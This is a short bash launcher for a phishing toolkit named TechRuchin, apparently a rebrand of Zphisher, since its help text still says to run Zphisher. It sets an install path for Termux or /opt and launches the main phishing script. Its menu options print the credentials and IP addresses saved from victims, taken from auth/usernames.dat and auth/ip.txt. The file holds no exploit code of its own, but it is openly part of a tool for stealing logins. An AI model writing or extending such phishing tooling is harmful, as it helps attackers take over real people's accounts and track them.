#!/bin/bash

# https://github.com/RuchinHimasha/TechRuchin

if [[ $(uname -o) == *'Android'* ]];then
	TECHRUCHIN_ROOT="/data/data/com.termux/files/usr/opt/TechRuchin"
else
	export TECHRUCHIN_ROOT="/opt/TechRuchin"
fi

if [[ $1 == '-h' || $1 == 'help' ]]; then
	echo "To run Zphisher type \`TechRuchin\` in your cmd"
	echo
	echo "Help:"
	echo " -h | help : Print this menu & Exit"
	echo " -c | auth : View Saved Credentials"
	echo " -i | ip   : View Saved Victim IP"
	echo
elif [[ $1 == '-c' || $1 == 'auth' ]]; then
	cat $TECHRUCHIN_ROOT/auth/usernames.dat 2> /dev/null || { 
		echo "No Credentials Found !"
		exit 1
	}
elif [[ $1 == '-i' || $1 == 'ip' ]]; then
	cat $TECHRUCHIN_ROOT/auth/ip.txt 2> /dev/null || {
		echo "No Saved IP Found !"
		exit 1
	}
else
	cd $TECHRUCHIN_ROOT
	bash ./TechRuchin.sh
fi
